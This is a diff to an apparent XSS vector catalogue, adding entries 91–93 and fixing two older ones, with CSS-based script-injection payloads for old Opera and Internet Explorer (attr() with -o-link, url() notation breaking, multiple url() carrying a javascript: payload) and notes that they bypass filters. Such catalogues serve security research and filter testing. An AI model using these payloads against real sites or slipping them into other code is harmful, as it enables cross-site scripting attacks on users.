@@ -1257,7 +1257,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<li style=list-style:url() onerror=%js_alert%>\n<div style=content:url(data:image/svg+xml,%3Csvg%3E%3C/svg%3E);visibility:hidden onload=%js_alert%></div>',
+        'data'       : '<li style=list-style:url() onerror=%js_alert%>\n<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=%js_alert%></div>',
         'description': {
             'en' : 'Opera 10.5 and earlier versions fire an error event for <LI> tags in case the background URL via style attribute cannot be loaded. The same works with "list-style-image" too. On Opera 10.10 and earlier more tag/style combinations like background:url() and background-image:url() work as well. Also works combination like content:url(svg).',
             'ja' : '',
@@ -2205,7 +2205,7 @@ var items =
         },
         'data'       : '<div style=width:0;filter:glow onfilterchange=%js_alert%>x',
         'description': {
-            'en' : 'In some situations it\'s possible to trigger a filterchange event by using jut one filter as the example shows. Also the short filter notation is being used which is supported by all IE versions despite the information in the documentation.', 
+            'en' : 'In some situations it\'s possible to trigger a filterchange event by using just one filter as the example shows. Also the short filter notation is being used which is supported by all IE versions despite the information in the documentation.', 
             'ja' : '',
             'ru' : '',
             'de' : ''
@@ -2853,6 +2853,93 @@ var items =
 	    'opera'  : ['10.x']
         },
         'tags'       : ['xss', 'svg', 'css', 'opera', 'content'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 91 - Using "attr()"*/
+        'id'         : 91,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'Using "attr()"',
+            'ja' : '',
+            'ru' : 'Использование "attr()"',
+            'de' : ''
+        },
+        'data'       : '<div x="javasc&#x0Aript:%js_alert%" style=-o-link:attr(x);-o-link-source:current>X',        
+        'description': {
+            'en' : 'Opera supports "attr()" as an value of the property "-o-link-source". This feature can be used to bypass filters.',
+            'ja' : '',
+            'ru' : 'Opera поддерживает "attr()" в качестве значения свойства "-o-link-source". Эта особенность может быть использована для обхода фильтров.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'opera' : ['9.x', '10.x']
+        },
+        'tags'       : ['xss', 'css', 'opera', 'trick', 'attr'],
+        'reporter'   : 'LeverOne, .mario'
+    },
+    { /* ID 92 - The trick to breaking the functional notation in IE*/
+        'id'         : 92,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'The trick to breaking the functional notation in IE',
+            'ja' : '',
+            'ru' : 'Способ разорвать функциональную нотацию в IE',
+            'de' : ''
+        },
+        'data'       : '<!Doctype>\n<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X',        
+        'description': {
+            'en' : 'As a breaker functional notation "url()" is used any whitespace, followed by any non-whitespace character.',
+            'ja' : '',
+            'ru' : 'В качестве прерывателя функциональной нотации "url()" может быть использована комбинация из любого пробельного символа, за которым следует любой непробельный символ.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': ['6.0', '7.0', '8.0']
+        },
+        'tags'       : ['xss', 'css', 'internet explorer', 'trick', 'notation'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 93 - Multiple "url()" in IE */
+        'id'         : 93,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'Multiple "url()" in IE',
+            'ja' : '',
+            'ru' : 'Множественный "url()" в IE',
+            'de' : ''
+        },
+        'data'       : '<div style="list-style:url(http://foo.f)\\20url(%js_uri_alert%);">X',        
+        'description': {
+            'en' : 'Intennet Explorer support multiple "url()", which can contain payload. Delimiter "url ()" should be a space character ("\\x20").',
+            'ja' : '',
+            'ru' : 'IE поддерживает множественный "url()", который может содержать "полезную нагрузку". Разделителем "url()" может быть только символ пробела (\\x20).',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': ['6.0']
+        },
+        'tags'       : ['xss', 'css', 'internet explorer', 'trick', 'url'],
         'reporter'   : 'LeverOne'
     }
 ]
